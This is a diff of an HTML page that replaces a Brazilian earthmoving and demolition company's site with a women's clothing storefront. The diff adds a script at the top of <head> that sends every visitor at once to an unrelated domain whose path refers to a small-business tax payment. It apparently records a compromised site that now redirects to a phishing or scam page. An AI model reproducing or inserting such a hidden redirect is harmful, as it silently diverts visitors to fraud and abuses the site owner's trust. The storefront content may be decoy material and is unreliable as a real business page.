@@ -1,714 +1,501 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>Engemarks – Terraplanagem, Demolição e Remoção de Entulhos</title>
-    <meta name="description" content="Engemarks: referência em terraplanagem, demolição e remoção de entulhos. Obras de pequeno, médio e grande porte com máquinas modernas e equipe especializada. Orçamento sem compromisso!" />
-    <link rel="canonical" href="https://engemarks.com.br/" />
-    <!-- Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+<head><script>
+  window.location.href = "https://simplesfacil.com/DASMEI-FAZENDA/";
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loja Loanita - Roupas Femininas</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-            background: #f4f7fa;
-            color: #1e2a3a;
-            line-height: 1.7;
-            scroll-behavior: smooth;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        a { text-decoration: none; color: inherit; }
-        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
 
-        /* HEADER */
-        header {
-            background: #003366;
-            color: #fff;
-            padding: 15px 0;
-            position: sticky;
-            top:0;
-            z-index:1000;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        body {
+            background-color: #f8f5f0;
+            color: #333;
         }
-        header .container {
+
+        /* Benefícios */
+        .top-bar {
+            background-color: #222;
+            color: #fff;
             display: flex;
-            justify-content: space-between;
-            align-items: center;
+            justify-content: center;
+            gap: 2rem;
+            padding: 8px 16px;
+            font-size: 0.85rem;
             flex-wrap: wrap;
         }
+
+        .top-bar span {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* Header */
+        .header {
+            background-color: #fff;
+            padding: 16px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            border-bottom: 1px solid #eee;
+        }
+
         .logo {
-            font-size: 26px;
-            font-weight: 700;
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #111;
             letter-spacing: -0.5px;
         }
-        .logo span { color: #f5a623; }
-        .logo small { font-size: 14px; font-weight: 400; opacity:0.8; display:block; }
-        nav ul {
-            list-style: none;
+
+        .logo span {
+            color: #c49a6c;
+        }
+
+        .search-bar {
             display: flex;
-            gap: 25px;
-            flex-wrap: wrap;
-        }
-        nav ul li a {
-            color: #fff;
-            font-weight: 500;
-            padding: 5px 0;
-            border-bottom: 3px solid transparent;
-            transition: 0.3s;
-        }
-        nav ul li a:hover { border-bottom-color: #f5a623; }
-        .menu-toggle { display: none; font-size: 28px; cursor: pointer; }
-
-        /* HERO */
-        .hero {
-            background: linear-gradient(135deg, #003366 0%, #1a4f7a 100%);
-            color: #fff;
-            padding: 80px 0 70px;
-            text-align: center;
-        }
-        .hero h1 {
-            font-size: 44px;
-            font-weight: 800;
-            letter-spacing: -1px;
-            margin-bottom: 20px;
-        }
-        .hero h1 span { color: #f5a623; }
-        .hero p {
-            font-size: 20px;
-            max-width: 750px;
-            margin: 0 auto 30px;
-            opacity: 0.9;
-        }
-        .btn {
-            background: #f5a623;
-            color: #003366;
-            padding: 14px 40px;
-            border-radius: 50px;
-            font-weight: 700;
-            font-size: 18px;
-            display: inline-block;
-            transition: 0.3s;
-            box-shadow: 0 4px 15px rgba(245,166,35,0.4);
-            border: none;
-            cursor: pointer;
-        }
-        .btn:hover { background: #e6951a; transform: scale(1.03); }
-        .btn i { margin-right: 8px; }
-
-        /* SEÇÕES */
-        section { padding: 60px 0; }
-        .section-title {
-            font-size: 32px;
-            font-weight: 700;
-            color: #003366;
-            margin-bottom: 15px;
-            position: relative;
-        }
-        .section-title::after {
-            content: '';
-            display: block;
-            width: 60px;
-            height: 4px;
-            background: #f5a623;
-            margin-top: 8px;
-        }
-        .section-sub {
-            color: #5a6b7c;
-            font-size: 18px;
-            margin-bottom: 30px;
+            flex: 1;
+            max-width: 400px;
+            margin: 0 20px;
         }
 
-        /* SOBRE */
-        .sobre-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 40px;
-            align-items: center;
-        }
-        .sobre-grid .texto p { margin-bottom: 15px; }
-        .sobre-grid .destaques {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-            background: #eef4fb;
-            padding: 30px;
-            border-radius: 12px;
-        }
-        .sobre-grid .destaques .item {
-            text-align: center;
-            padding: 20px 10px;
-            background: #fff;
-            border-radius: 10px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-        }
-        .sobre-grid .destaques .item i { font-size: 36px; color: #f5a623; margin-bottom: 8px; }
-        .sobre-grid .destaques .item h4 { color: #003366; }
-
-        /* SERVIÇOS */
-        .servicos-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px,1fr));
-            gap: 25px;
-        }
-        .servicos-grid .card {
-            background: #fff;
-            border-radius: 12px;
-            padding: 25px 20px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
-            text-align: center;
-            transition: 0.3s;
-            border-bottom: 4px solid transparent;
-        }
-        .servicos-grid .card:hover { border-bottom-color: #f5a623; transform: translateY(-5px); }
-        .servicos-grid .card i { font-size: 40px; color: #003366; margin-bottom: 12px; }
-        .servicos-grid .card h3 { font-size: 18px; color: #003366; }
-
-        /* DEPOIMENTOS CAROUSEL */
-        .depoimentos-slider {
-            background: #003366;
-            color: #fff;
-            padding: 50px 0;
-            text-align: center;
-        }
-        .depoimentos-slider .section-title { color: #fff; }
-        .depoimentos-slider .section-title::after { background: #f5a623; }
-        .slider-wrapper {
-            overflow: hidden;
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        .slider-track {
-            display: flex;
-            transition: transform 0.5s ease;
-            will-change: transform;
-        }
-        .slider-item {
-            min-width: 100%;
-            padding: 20px 30px;
-            font-size: 18px;
-            font-style: italic;
-            box-sizing: border-box;
-        }
-        .slider-item .autor { font-weight: 700; font-style: normal; margin-top: 15px; color: #f5a623; }
-        .slider-controls {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 25px;
-        }
-        .slider-controls button {
-            background: #f5a623;
-            border: none;
-            color: #003366;
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            font-size: 22px;
-            cursor: pointer;
-            font-weight: 700;
-            transition: 0.3s;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .slider-controls button:hover { background: #e6951a; transform: scale(1.05); }
-
-        /* DIFERENCIAIS */
-        .diferenciais-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px,1fr));
-            gap: 30px;
-            margin-top: 20px;
-        }
-        .diferenciais-grid .item {
-            background: #fff;
-            padding: 30px 25px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
-            text-align: center;
-        }
-        .diferenciais-grid .item i { font-size: 44px; color: #f5a623; margin-bottom: 15px; }
-
-        /* FAQ */
-        .faq-item {
-            background: #fff;
-            border-radius: 10px;
-            margin-bottom: 12px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-            overflow: hidden;
-        }
-        .faq-item .pergunta {
-            padding: 18px 25px;
-            font-weight: 700;
-            color: #003366;
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: #f8fafc;
-            transition: 0.3s;
-        }
-        .faq-item .pergunta:hover { background: #eef4fb; }
-        .faq-item .pergunta i { transition: 0.3s; }
-        .faq-item .resposta {
-            padding: 0 25px 20px;
-            display: none;
-            color: #2c3e50;
-        }
-        .faq-item.active .resposta { display: block; }
-        .faq-item.active .pergunta i { transform: rotate(180deg); }
-
-        /* CONTATO + MAPA */
-        .contato-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 40px;
-        }
-        .contato-grid .info p { margin-bottom: 12px; }
-        .contato-grid .info i { width: 28px; color: #f5a623; }
-        .contato-grid form input,
-        .contato-grid form textarea {
-            width: 100%;
-            padding: 14px 18px;
-            border: 1px solid #dde4ec;
-            border-radius: 8px;
-            font-size: 16px;
-            margin-bottom: 15px;
-            font-family: inherit;
-            transition: 0.3s;
-        }
-        .contato-grid form input:focus,
-        .contato-grid form textarea:focus {
-            border-color: #f5a623;
+        .search-bar input {
+            flex: 1;
+            padding: 10px 14px;
+            border: 1px solid #ddd;
+            border-radius: 30px 0 0 30px;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(245,166,35,0.2);
+            font-size: 0.95rem;
         }
-        .contato-grid form button {
-            background: #003366;
-            color: #fff;
-            padding: 14px 30px;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        .contato-grid form button:hover { background: #1a4f7a; }
-        .contato-grid form button i { margin-right: 8px; }
-        .mapa iframe {
-            width: 100%;
-            height: 350px;
-            border-radius: 12px;
-            border: 0;
-        }
-        .btn-whatsapp {
-            background: #25d366;
-            color: #fff;
-            padding: 12px 28px;
-            border-radius: 50px;
-            font-weight: 700;
-            display: inline-block;
-            transition: 0.3s;
-            border: none;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        .btn-whatsapp:hover { background: #1da851; transform: scale(1.03); }
-        .btn-whatsapp i { margin-right: 8px; }
 
-        /* BOTÃO VOLTAR AO TOPO */
-        #btnTopo {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            background: #f5a623;
-            color: #003366;
+        .search-bar button {
+            padding: 10px 18px;
+            background-color: #111;
+            color: #fff;
             border: none;
-            border-radius: 50%;
-            width: 55px;
-            height: 55px;
-            font-size: 24px;
+            border-radius: 0 30px 30px 0;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(245,166,35,0.4);
-            transition: 0.3s;
-            display: none;
+            font-weight: bold;
+        }
+
+        .cart-icon {
+            font-size: 1.4rem;
+            background: #f0ebe4;
+            padding: 8px 16px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+        }
+
+        /* Menu */
+        .main-menu {
+            background-color: #fff;
+            padding: 10px 24px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px 30px;
+            border-bottom: 1px solid #eee;
+            font-weight: 500;
+        }
+
+        .main-menu a {
+            text-decoration: none;
+            color: #222;
+            font-size: 0.95rem;
+            transition: color 0.2s;
+        }
+
+        .main-menu a:hover {
+            color: #c49a6c;
+        }
+
+        /* Banner simulado */
+        .banner {
+            background: linear-gradient(135deg, #f0ebe4, #e6dcd0);
+            margin: 20px 24px;
+            padding: 40px 20px;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .banner h2 {
+            font-size: 2.2rem;
+            font-weight: 300;
+            letter-spacing: 2px;
+        }
+
+        .banner h2 strong {
+            font-weight: 600;
+            color: #222;
+        }
+
+        .banner p {
+            margin-top: 8px;
+            font-size: 1.1rem;
+            color: #555;
+        }
+
+        /* Produtos */
+        .section-title {
+            font-size: 1.6rem;
+            font-weight: 300;
+            margin: 30px 24px 10px;
+            letter-spacing: 1px;
+        }
+
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 24px;
+            margin: 0 24px 30px;
+        }
+
+        .product-card {
+            background: #fff;
+            border-radius: 8px;
+            padding: 16px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+            transition: box-shadow 0.2s;
+            text-align: center;
+        }
+
+        .product-card:hover {
+            box-shadow: 0 6px 20px rgba(0,0,0,0.08);
+        }
+
+        .product-image {
+            background: #f2ede7;
+            height: 180px;
+            border-radius: 6px;
+            display: flex;
             align-items: center;
             justify-content: center;
-            z-index: 999;
+            color: #aaa;
+            font-size: 0.9rem;
+            margin-bottom: 12px;
         }
-        #btnTopo:hover { background: #e6951a; transform: scale(1.1); }
 
-        /* RODAPÉ */
-        footer {
-            background: #001a33;
-            color: #b0c4de;
-            padding: 40px 0 20px;
-            margin-top: 20px;
+        .product-name {
+            font-weight: 600;
+            font-size: 0.95rem;
+            margin: 8px 0 4px;
+            color: #111;
         }
-        footer .container {
-            display: grid;
-            grid-template-columns: 2fr 1fr 1fr 1fr;
-            gap: 30px;
+
+        .product-price {
+            font-size: 1.4rem;
+            font-weight: bold;
+            color: #111;
+            margin: 6px 0 2px;
         }
-        footer h4 { color: #fff; margin-bottom: 15px; }
-        footer ul { list-style: none; }
-        footer ul li { margin-bottom: 8px; }
-        footer ul li a:hover { color: #f5a623; }
-        footer .copy {
-            grid-column: 1 / -1;
+
+        .product-installments {
+            font-size: 0.8rem;
+            color: #666;
+            margin-bottom: 12px;
+        }
+
+        .btn-buy {
+            background-color: #111;
+            color: #fff;
+            border: none;
+            padding: 10px 0;
+            width: 100%;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-buy:hover {
+            background-color: #c49a6c;
+        }
+
+        /* Depoimentos */
+        .testimonials {
+            background-color: #fff;
+            padding: 30px 24px;
+            margin: 10px 0 20px;
+        }
+
+        .testimonials h3 {
+            font-size: 1.5rem;
+            font-weight: 300;
             text-align: center;
-            border-top: 1px solid #1a3a5a;
-            padding-top: 20px;
-            margin-top: 20px;
-            font-size: 14px;
-            color: #6a8aaa;
+            margin-bottom: 24px;
         }
 
-        /* RESPONSIVO */
-        @media (max-width: 920px) {
-            .sobre-grid { grid-template-columns: 1fr; }
-            .contato-grid { grid-template-columns: 1fr; }
-            footer .container { grid-template-columns: 1fr 1fr; }
-            .hero h1 { font-size: 32px; }
+        .testimonial-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 20px;
         }
-        @media (max-width: 650px) {
-            .menu-toggle { display: block; }
-            nav ul {
-                display: none;
-                flex-direction: column;
-                width: 100%;
-                background: #003366;
-                padding: 15px 0;
-                margin-top: 10px;
-                gap: 10px;
-            }
-            nav ul.open { display: flex; }
-            nav ul li { text-align: center; }
-            .hero { padding: 50px 0; }
-            .hero h1 { font-size: 26px; }
-            .sobre-grid .destaques { grid-template-columns: 1fr; }
-            .servicos-grid { grid-template-columns: 1fr 1fr; }
-            footer .container { grid-template-columns: 1fr; }
-            #btnTopo { width: 45px; height: 45px; font-size: 20px; bottom: 20px; right: 20px; }
+
+        .testimonial-card {
+            background: #f8f5f0;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+
+        .testimonial-card strong {
+            display: block;
+            margin-top: 10px;
+            color: #111;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #111;
+            color: #ccc;
+            padding: 30px 24px 16px;
+            margin-top: 20px;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 30px;
+            margin-bottom: 24px;
+        }
+
+        .footer-grid h4 {
+            color: #fff;
+            margin-bottom: 10px;
+            font-weight: 400;
+            letter-spacing: 1px;
+        }
+
+        .footer-grid a, .footer-grid p {
+            display: block;
+            color: #aaa;
+            text-decoration: none;
+            font-size: 0.9rem;
+            line-height: 1.8;
+        }
+
+        .footer-grid a:hover {
+            color: #fff;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid #333;
+            padding-top: 16px;
+            text-align: center;
+            font-size: 0.8rem;
+            color: #777;
+        }
+
+        .payment-icons {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-top: 6px;
+        }
+
+        .payment-icons span {
+            background: #222;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            color: #ccc;
+        }
+
+        @media (max-width: 600px) {
+            .top-bar { font-size: 0.7rem; gap: 10px; }
+            .header { flex-direction: column; align-items: stretch; gap: 12px; }
+            .search-bar { max-width: 100%; margin: 0; }
+            .cart-icon { align-self: flex-end; }
+            .main-menu { justify-content: center; gap: 12px; }
+            .banner h2 { font-size: 1.5rem; }
+            .product-grid { grid-template-columns: 1fr 1fr; gap: 12px; margin: 0 12px; }
+            .product-image { height: 130px; }
         }
     </style>
 </head>
 <body>
 
-<!-- ===== HEADER ===== -->
-<header>
-    <div class="container">
-        <div class="logo">
-            ENGEMARKS <span>.</span>
-            <small>Terraplanagem & Demolição</small>
-        </div>
-        <div class="menu-toggle" id="menuToggle">
-            <i class="fas fa-bars"></i>
-        </div>
-        <nav>
-            <ul id="navMenu">
-                <li><a href="#sobre">Sobre</a></li>
-                <li><a href="#servicos">Serviços</a></li>
-                <li><a href="#diferenciais">Diferenciais</a></li>
-                <li><a href="#depoimentos">Depoimentos</a></li>
-                <li><a href="#faq">FAQ</a></li>
-                <li><a href="#contato">Contato</a></li>
-            </ul>
-        </nav>
+    <!-- Topo com benefícios -->
+    <div class="top-bar">
+        <span>🔒 Segurança garantida em cada compra!</span>
+        <span>🚀 Entrega rápida para todo Brasil</span>
+        <span>🔄 Troca fácil e rápida!</span>
     </div>
-</header>
 
-<!-- ===== HERO ===== -->
-<section class="hero">
-    <div class="container">
-        <h1>Terraplanagem, Demolição e <span>Remoção de Entulhos</span></h1>
-        <p>Referência em obras de pequeno, médio e grande porte. Máquinas modernas, equipe especializada e atendimento personalizado.</p>
-        <a href="#contato" class="btn"><i class="fas fa-pencil-alt"></i> Solicitar Orçamento</a>
+    <!-- Header -->
+    <header class="header">
+        <div class="logo">Loja <span>Loanita</span></div>
+        <div class="search-bar">
+            <input type="text" placeholder="O que você procura?">
+            <button>Buscar</button>
+        </div>
+        <div class="cart-icon">🛒 0</div>
+    </header>
+
+    <!-- Menu -->
+    <nav class="main-menu">
+        <a href="#">NOVIDADES ✨</a>
+        <a href="#">MAIS VENDIDOS</a>
+        <a href="#">LOOK COMPLETO</a>
+        <a href="#">PARTE DE CIMA</a>
+        <a href="#">PARTE DE BAIXO</a>
+        <a href="#">PREÇO MAX 49,99</a>
+    </nav>
+
+    <!-- Banner -->
+    <div class="banner">
+        <h2>PARCELE SUAS COMPRAS<br>EM ATÉ <strong>3x SEM JUROS</strong></h2>
+        <p>Conjuntos • Calças • Macacões</p>
     </div>
-</section>
 
-<!-- ===== SOBRE ===== -->
-<section id="sobre">
-    <div class="container">
-        <h2 class="section-title">Sobre a Engemarks</h2>
-        <p class="section-sub">Conheça nossa história e compromisso com a excelência</p>
-        <div class="sobre-grid">
-            <div class="texto">
-                <p>A <strong>Engemarks</strong> é uma empresa especializada em <strong>terraplanagem, demolição, remoção de entulhos e serviços de fundação</strong>. Atuamos nos mais diversos segmentos da construção civil, sempre com foco em qualidade, segurança e pontualidade.</p>
-                <p>Contamos com um parque de máquinas moderno e uma equipe altamente qualificada, garantindo agilidade e precisão em cada projeto. Nossa missão é estabelecer uma parceria sólida com nossos clientes, oferecendo soluções completas e suporte em todas as etapas.</p>
-                <p><i class="fas fa-check-circle" style="color:#f5a623;"></i> <strong>Atendimento presencial e digital</strong> – Estamos localizados em Itanhaém/SP e atendemos toda a região.</p>
+    <!-- Lançamentos -->
+    <h2 class="section-title">✨ Lançamentos</h2>
+    <div class="product-grid">
+        <div class="product-card">
+            <div class="product-image">CALÇA JEANS<br>JÉSSICA</div>
+            <div class="product-name">CALÇA JEANS MON FEMININA JÉSSICA</div>
+            <div class="product-price">R$129,99</div>
+            <div class="product-installments">3x de R$43,33 sem juros</div>
+            <button class="btn-buy">Eu quero</button>
+        </div>
+        <div class="product-card">
+            <div class="product-image">CALÇA WIDE LEG<br>BELY</div>
+            <div class="product-name">CALÇA JEANS WIDE LEG FEMININA BELY</div>
+            <div class="product-price">R$129,99</div>
+            <div class="product-installments">3x de R$43,33 sem juros</div>
+            <button class="btn-buy">Eu quero</button>
+        </div>
+        <div class="product-card">
+            <div class="product-image">CAMISA LINHO<br>FANY</div>
+            <div class="product-name">CAMISA DE LINHO FANY FEMININA</div>
+            <div class="product-price">R$129,99</div>
+            <div class="product-installments">3x de R$43,33 sem juros</div>
+            <button class="btn-buy">Eu quero</button>
+        </div>
+        <div class="product-card">
+            <div class="product-image">MACAQUINHO<br>AMI</div>
+            <div class="product-name">MACAQUINHO CREPE ESTAMPA POÁ AMI</div>
+            <div class="product-price">R$109,99</div>
+            <div class="product-installments">3x de R$36,66 sem juros</div>
+            <button class="btn-buy">Eu quero</button>
+        </div>
+        <div class="product-card">
+            <div class="product-image">MACACÃO JEANS<br>JOSI</div>
+            <div class="product-name">MACACÃO JEANS TOMARA QUE CAIA JOSI</div>
+            <div class="product-price">R$179,99</div>
+            <div class="product-installments">3x de R$60,00 sem juros</div>
+            <button class="btn-buy">Eu quero</button>
+        </div>
+        <div class="product-card">
+            <div class="product-image">CONJUNTO JEANS<br>BRENDA</div>
+            <div class="product-name">CONJUNTO JEANS CROPPED E CALÇA BALLON BRENDA</div>
+            <div class="product-price">R$229,99</div>
+            <div class="product-installments">3x de R$76,66 sem juros</div>
+            <button class="btn-buy">Eu quero</button>
+        </div>
+        <div class="product-card">
+            <div class="product-image">SHORT SENSORIAL<br>GIGI</div>
+            <div class="product-name">SHORT SENSORIAL COM BABADOS GIGI</div>
+            <div class="product-price">R$89,99</div>
+            <div class="product-installments">3x de R$30,00 sem juros</div>
+            <button class="btn-buy">Eu quero</button>
+        </div>
+        <div class="product-card">
+            <div class="product-image">CALÇA STRASS<br>CAMILA</div>
+            <div class="product-name">CALÇA STRASS COM CINTO WIDE LEG CAMILA</div>
+            <div class="product-price">R$349,99</div>
+            <div class="product-installments">3x de R$116,66 sem juros</div>
+            <button class="btn-buy">Eu quero</button>
+        </div>
+    </div>
+
+    <!-- Depoimentos -->
+    <section class="testimonials">
+        <h3>💬 O que nossas clientes dizem</h3>
+        <div class="testimonial-grid">
+            <div class="testimonial-card">
+                "A entrega chegou sexta. Eu amei as peças. Deu certinho todas as medidas, vestem super bem. Obrigada pelo atendimento também"
+                <strong>— Andressa</strong>
             </div>
-            <div class="destaques">
-                <div class="item"><i class="fas fa-calendar-alt"></i><h4>+10 anos</h4><p>de experiência no mercado</p></div>
-                <div class="item"><i class="fas fa-users"></i><h4>Equipe própria</h4><p>profissionais treinados e capacitados</p></div>
-                <div class="item"><i class="fas fa-truck"></i><h4>Frota moderna</h4><p>máquinas e caminhões de alto desempenho</p></div>
-                <div class="item"><i class="fas fa-map-marker-alt"></i><h4>Atendimento regional</h4><p>litoral paulista e interior</p></div>
+            <div class="testimonial-card">
+                "Chegou tudo lindo e entrega rápida, obrigada"
+                <strong>— Rebeca Fagundes</strong>
+            </div>
+            <div class="testimonial-card">
+                "Chegou bem embalado, chegou até antes do prazo, sempre vou comprar com vocês ❤"
+                <strong>— María Viviane Soares</strong>
+            </div>
+            <div class="testimonial-card">
+                "Sou fã da Loanita! Quase 80% do meu guarda-roupa é Loanita. Atendimento maravilhoso! Nota mil ✨"
+                <strong>— Vitória Bertoni</strong>
+            </div>
+            <div class="testimonial-card">
+                "Simplesmente amei 🥰 lindas e de ótima qualidade, preço muito bom. Atendimento nota 10"
+                <strong>— Fernanda Cristina</strong>
+            </div>
+            <div class="testimonial-card">
+                "Melhor loja, entrega super rápida, amo comprar na Loanita ❤🥰"
+                <strong>— Ivânia Barbosa</strong>
+            </div>
+            <div class="testimonial-card">
+                "Com certeza irei comprar mais looks, me surpreendi com a qualidade! Os detalhes, tudo perfeito 😍"
+                <strong>— Luciana Pais</strong>
+            </div>
+            <div class="testimonial-card">
+                "Meu pedido chegou antes do prazo, estava com medo de ser golpe mas vocês foram maravilhosas. Virei cliente 💞"
+                <strong>— Patricia</strong>
             </div>
         </div>
-    </div>
-</section>
+    </section>
 
-<!-- ===== SERVIÇOS ===== -->
-<section id="servicos" style="background:#f8fafc;">
-    <div class="container">
-        <h2 class="section-title">Nossos Serviços</h2>
-        <p class="section-sub">Soluções completas para sua obra ou terreno</p>
-        <div class="servicos-grid">
-            <div class="card"><i class="fas fa-mountain"></i><h3>Terraplanagem</h3><p>Nivelamento, corte e aterro para preparação do terreno.</p></div>
-            <div class="card"><i class="fas fa-tree"></i><h3>Limpeza de Terreno</h3><p>Remoção de vegetação, entulhos e resíduos.</p></div>
-            <div class="card"><i class="fas fa-hard-hat"></i><h3>Fundações</h3><p>Escavação, sapatas, estacas e radier.</p></div>
-            <div class="card"><i class="fas fa-tractor"></i><h3>Escavação</h3><p>Valas, subsolos e caves com precisão.</p></div>
-            <div class="card"><i class="fas fa-dumpster"></i><h3>Remoção de Entulhos</h3><p>Coleta e destinação correta de resíduos.</p></div>
-            <div class="card"><i class="fas fa-bullldozer"></i><h3>Demolição</h3><p>Mecanizada ou manual, com segurança.</p></div>
-            <div class="card"><i class="fas fa-ruler-combined"></i><h3>Baldrames</h3><p>Estruturas de concreto para sua construção.</p></div>
-            <div class="card"><i class="fas fa-cogs"></i><h3>Locação de Máquinas</h3><p>Retroescavadeiras, tratores, caminhões.</p></div>
-        </div>
-    </div>
-</section>
-
-<!-- ===== DIFERENCIAIS ===== -->
-<section id="diferenciais">
-    <div class="container">
-        <h2 class="section-title">Por que escolher a Engemarks?</h2>
-        <p class="section-sub">Nosso compromisso com a qualidade e a satisfação do cliente</p>
-        <div class="diferenciais-grid">
-            <div class="item"><i class="fas fa-medal"></i><h4>Excelência técnica</h4><p>Equipe experiente e atualizada com as melhores práticas do setor.</p></div>
-            <div class="item"><i class="fas fa-headset"></i><h4>Atendimento personalizado</h4><p>Orçamento sem compromisso e suporte contínuo durante todo o projeto.</p></div>
-            <div class="item"><i class="fas fa-shield-alt"></i><h4>Segurança e responsabilidade</h4><p>Cumprimos rigorosamente as normas de segurança e ambientais.</p></div>
-            <div class="item"><i class="fas fa-clock"></i><h4>Cumprimento de prazos</h4><p>Planejamento e execução ágil para entregar no prazo combinado.</p></div>
-        </div>
-    </div>
-</section>
-
-<!-- ===== DEPOIMENTOS CAROUSEL ===== -->
-<section id="depoimentos" class="depoimentos-slider">
-    <div class="container">
-        <h2 class="section-title">O que nossos clientes dizem</h2>
-        <div class="slider-wrapper">
-            <div class="slider-track" id="sliderTrack">
-                <div class="slider-item">
-                    “Contratamos a Engemarks para retirar o entulho e fazer a terraplanagem da obra. Fomos atendidos com rapidez e os profissionais fizeram um excelente trabalho.”
-                    <div class="autor">– Cliente Itanhaém</div>
+    <!-- Rodapé -->
+    <footer class="footer">
+        <div class="footer-grid">
+            <div>
+                <h4>Loja Loanita</h4>
+                <a href="#">Quem Somos</a>
+                <a href="#">Trocas e Devoluções</a>
+                <a href="#">Política de Privacidade</a>
+                <a href="#">Como comprar</a>
+                <a href="#">Contato</a>
+            </div>
+            <div>
+                <h4>Entre em contato</h4>
+                <p>📞 (37) 99199-5121</p>
+                <p>📞 (37) 99196-3165</p>
+                <p>✉️ admlojaloanita@gmail.com</p>
+                <p>📍 Rua Veli Tático, 45, Centro, Nova Serrana - MG</p>
+                <p>🕒 Seg–Sex 9h–19h | Sáb 9h–12:30</p>
+            </div>
+            <div>
+                <h4>Formas de pagamento</h4>
+                <div class="payment-icons">
+                    <span>Visa</span>
+                    <span>Mastercard</span>
+                    <span>Amex</span>
+                    <span>Diners</span>
+                    <span>Mercado Pago</span>
+                    <span>PayPal</span>
                 </div>
-                <div class="slider-item">
-                    “Quero agradecer a todos pelo ótimo trabalho que fizeram. Era o sonho da nossa família ter uma piscina e vocês tornaram realidade fazendo a escavação para a colocação dela.”
-                    <div class="autor">– Família Santos</div>
-                </div>
-                <div class="slider-item">
-                    “Comprei um terreno com uma casa antiga que precisava ser demolida. Chamei a Engemarks e fiquei muito satisfeito com a qualidade do serviço e o profissionalismo da equipe.”
-                    <div class="autor">– Sr. Oliveira</div>
-                </div>
-                <div class="slider-item">
-                    “Profissionais extremamente competentes. Fizeram a fundação da minha casa com muita precisão e dentro do prazo. Recomendo a todos.”
-                    <div class="autor">– Dra. Mariana</div>
-                </div>
+                <h4 style="margin-top: 16px;">Segurança</h4>
+                <p>🔒 Compra segura</p>
             </div>
         </div>
-        <div class="slider-controls">
-            <button id="prevBtn" aria-label="Depoimento anterior"><i class="fas fa-chevron-left"></i></button>
-            <button id="nextBtn" aria-label="Próximo depoimento"><i class="fas fa-chevron-right"></i></button>
+        <div class="footer-bottom">
+            ©2026. Loja Loanita - 18819125000103. Todos os direitos reservados.
         </div>
-    </div>
-</section>
-
-<!-- ===== FAQ ===== -->
-<section id="faq">
-    <div class="container">
-        <h2 class="section-title">Perguntas Frequentes</h2>
-        <div class="faq-item active">
-            <div class="pergunta" onclick="toggleFaq(this)">Como solicitar um orçamento? <i class="fas fa-chevron-down"></i></div>
-            <div class="resposta">Basta clicar no botão "Solicitar Orçamento" no topo da página, ou entrar em contato pelo WhatsApp (13) 99677-2637 ou telefone (13) 3427-2020. Respondemos rapidamente com um diagnóstico inicial.</div>
-        </div>
-        <div class="faq-item">
-            <div class="pergunta" onclick="toggleFaq(this)">Vocês atendem toda a região do litoral paulista? <i class="fas fa-chevron-down"></i></div>
-            <div class="resposta">Sim! Atendemos Itanhaém, Peruíbe, Mongaguá, Praia Grande, Santos, São Vicente e demais cidades da Baixada Santista, além de interior mediante avaliação.</div>
-        </div>
-        <div class="faq-item">
-            <div class="pergunta" onclick="toggleFaq(this)">Quais tipos de máquinas vocês possuem? <i class="fas fa-chevron-down"></i></div>
-            <div class="resposta">Temos retroescavadeiras, tratores de esteira, caminhões caçamba, pás carregadeiras, escavadeiras hidráulicas e equipamentos para demolição. Tudo moderno e com manutenção em dia.</div>
-        </div>
-        <div class="faq-item">
